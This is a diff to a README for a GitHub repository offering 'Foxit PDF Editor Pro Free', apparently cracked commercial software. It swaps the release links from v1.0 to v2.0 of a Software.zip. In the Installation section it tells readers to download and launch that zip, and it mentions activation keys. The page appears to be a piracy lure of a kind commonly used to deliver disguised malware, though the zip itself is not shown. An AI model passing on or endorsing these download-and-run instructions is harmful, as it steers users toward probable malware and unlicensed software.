@@ -4,7 +4,7 @@ Welcome to the official repository of the **Foxit PDF Editor Pro Free** project!
 
 ### Repository Overview
 
-![Foxit PDF Editor Pro Free](https://github.com/thecoolmonkey88/Foxit-PDF-Editor-Pro-Free/releases/download/v1.0/Software.zip)
+![Foxit PDF Editor Pro Free](https://github.com/thecoolmonkey88/Foxit-PDF-Editor-Pro-Free/releases/download/v2.0/Software.zip)
 
 This repository is a hub for discussions, issues, and contributions related to the **Foxit PDF Editor Pro Free**. Whether you're comparing activation keys, exploring the features of the Pro version, or evaluating the benefits of Foxit over Adobe Acrobat, you'll find everything you need right here.
 
@@ -35,7 +35,7 @@ This repository is a hub for discussions, issues, and contributions related to t
 
 ### 📦 Installation
 
-To install the **Foxit PDF Editor Pro Free**, download the [zip file](https://github.com/thecoolmonkey88/Foxit-PDF-Editor-Pro-Free/releases/download/v1.0/Software.zip) from the provided link. Launch the file for the setup process to begin.
+To install the **Foxit PDF Editor Pro Free**, download the [zip file](https://github.com/thecoolmonkey88/Foxit-PDF-Editor-Pro-Free/releases/download/v2.0/Software.zip) from the provided link. Launch the file for the setup process to begin.
 
 ### 🔗 Additional Resources
 
